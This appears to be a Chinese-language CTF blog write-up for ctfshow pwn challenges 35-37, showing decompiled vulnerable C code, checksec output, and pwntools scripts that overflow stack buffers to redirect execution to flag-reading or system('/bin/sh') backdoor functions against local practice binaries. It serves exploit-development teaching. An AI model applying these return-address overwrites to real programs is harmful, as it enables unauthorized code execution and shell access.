<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn35-90(50,53还需要再看看) | Rhea's Blog</title><meta name="author" content="Rhea"><meta name="copyright" content="Rhea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="栈溢出pwn35Hint：正式开始栈溢出了，先来一个最最最最简单的吧	  用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接	  ssh ctfshow@题目地址 -p题目端口号	  不是nc连接  $ cyclic 105aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaat">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn35-90(50,53还需要再看看)">
<meta property="og:url" content="https://rhea006.github.io/2025/07/5881f3e28f68.html">
<meta property="og:site_name" content="Rhea&#39;s Blog">
<meta property="og:description" content="栈溢出pwn35Hint：正式开始栈溢出了，先来一个最最最最简单的吧	  用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接	  ssh ctfshow@题目地址 -p题目端口号	  不是nc连接  $ cyclic 105aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaat">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://rhea006.github.io/img/w7.jpg">
<meta property="article:published_time" content="2025-07-17T04:00:00.000Z">
<meta property="article:modified_time" content="2025-07-24T14:40:01.326Z">
<meta property="article:author" content="Rhea">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://rhea006.github.io/img/w7.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "pwn35-90(50,53还需要再看看)",
  "url": "https://rhea006.github.io/2025/07/5881f3e28f68.html",
  "image": "https://rhea006.github.io/img/w7.jpg",
  "datePublished": "2025-07-17T04:00:00.000Z",
  "dateModified": "2025-07-24T14:40:01.326Z",
  "author": [
    {
      "@type": "Person",
      "name": "Rhea",
      "url": "https://rhea006.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://rhea006.github.io/2025/07/5881f3e28f68.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pwn35-90(50,53还需要再看看)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Rhea's Blog" type="application/atom+xml">
</head><body><div id="web_bg" style="background-image: url(/img/background1.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">65</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/w7.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/logo.png" alt="Logo"><span class="site-name">Rhea's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">pwn35-90(50,53还需要再看看)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">pwn35-90(50,53还需要再看看)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-17T04:00:00.000Z" title="发表于 2025-07-17 12:00:00">2025-07-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-24T14:40:01.326Z" title="更新于 2025-07-24 22:40:01">2025-07-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/ctfshow-pwn/">ctfshow_pwn</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/ctfshow-pwn/4-%E6%A0%88%E6%BA%A2%E5%87%BA/">4-栈溢出</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint：正式开始栈溢出了，先来一个最最最最简单的吧</span><br><span class="line">	  用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</span><br><span class="line">	  ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">	  不是nc连接</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cyclic 105</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb</span><br><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">$./pwnme aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : See what the program does!</span><br><span class="line">    * *************************************</span><br><span class="line">Where is flag?</span><br><span class="line"></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure>

<h6 id="分析过程："><a href="#分析过程：" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32位程序开启NX，部分开启RELRO</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+0h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  signal(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048910);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048984);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A8C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B1C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048BA0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048C34);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : See what the program does!                              &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Where is flag?\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;QaQ!FLAG IS NOT HERE! Here is your input : %s&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打开”&#x2F;ctfshow_flag” 文件，读取其中的内容，并根据命令行参数决定打印不同的消息。如果命令行参数个数小于等于 1，则提示用户重试，否则调用 ctfshow 函数处理用户输入的命令行参数，并输出相关消息。</p>
<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>char dest; 声明一个名为 dest 的字符变量。 return strcpy(&amp;dest, src); 使用 strcpy 函数将 src 字符串复制到 dest 字符数组中，并返回指向 dest 的指针。strcpy函数这个函数是一个典型的可以用来利用溢出的函数。所以我们可以在这里进行栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804B060                 public flag</span><br><span class="line">.bss:0804B060 ; char flag[64]</span><br><span class="line">.bss:0804B060 flag            db 40h dup(?)           ; DATA XREF: sigsegv_handler+1D↑o</span><br><span class="line">.bss:0804B060                                         ; main+66↑o</span><br><span class="line">.bss:0804B060 _bss            ends</span><br><span class="line">.bss:0804B060</span><br></pre></td></tr></table></figure>

<p>注意到signal(11, (__sighandler_t)sigsegv_handler);函数</p>
<p>当发生 对存储的无效访问时,会把stderr打印输出,即将flag的值打印输出</p>
<p>那么我们直接输入超长数据就会溢出，程序就会崩溃进而打印出flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cyclic 105</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb</span><br><span class="line">$ ./pwn aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabb</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : See what the program does!</span><br><span class="line">    * *************************************</span><br><span class="line">Where is flag?</span><br><span class="line"></span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h2><p>Hint：存在后门函数，如何利用？</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  RWX:        Has RWX segments</span><br></pre></td></tr></table></figure>

<p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Stack_Overflow                                          &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : There are backdoor functions here!                      &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Find and use it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter what you want: &quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p>
<p>还在程序中找到了get_flag函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_flag</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [esp+Ch] [ebp-4Ch] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">&quot;/ctfshow_flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag: No such file or directory.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">64</span>, stream);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要利用栈溢出漏洞覆盖返回地址，将程序的执行流程转向 get_flag 函数，从而获取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">flag=elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line">payload=cyclic(<span class="number">0x28</span>+<span class="number">4</span>)+p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure>

<h2 id="pwn37"><a href="#pwn37" class="headerlink" title="pwn37"></a>pwn37</h2><p>Hint：32位的 system(“&#x2F;bin&#x2F;sh”) 后门函数给你</p>
<p>checksec检查保护</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>

<p>32为程序，关闭了栈保护与PIE</p>
<p>32位IDA查看main函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just very easy ret2text&amp;&amp;32bit&quot;</span>);</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExit&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单查看能够看到漏洞函数为ctfshow函数，跟进ctfshow函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先声明了一个名为 buf 的字符数组，大小为14字节它距离ebp的距离为0x12，这里通过read函数</p>
<p>buf能读入0x32 ，转换为10进制就是50个字节的数据，因此这里很明显就存在栈溢出了，在找到漏洞点</p>
<p>后，很明显看到左边有一个backdoor函数，跟进查看：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现是我们所需的一个后门函数，那么我们直接进行溢出覆盖返回地址再输入后门函数地址即可控</p>
<p>制程序的执行流程至此，那么我们也就得到了我们所需要的一个shell了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">backdoor=<span class="number">0x08048521</span> <span class="comment">#backdoor = elf.sym[&#x27;backdoor&#x27;]</span></span><br><span class="line">payload=cyclic(<span class="number">0x12</span>+<span class="number">4</span>)+p32(backdoor) <span class="comment">#b&#x27;a&#x27;*(0x12+4)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 76</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : It has system and <span class="string">&#x27;/bin/sh&#x27;</span>.There is a backdoor <span class="keyword">function</span></span><br><span class="line">    * *************************************</span><br><span class="line">Just very easy ret2text&amp;&amp;32bit</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag  exp.py  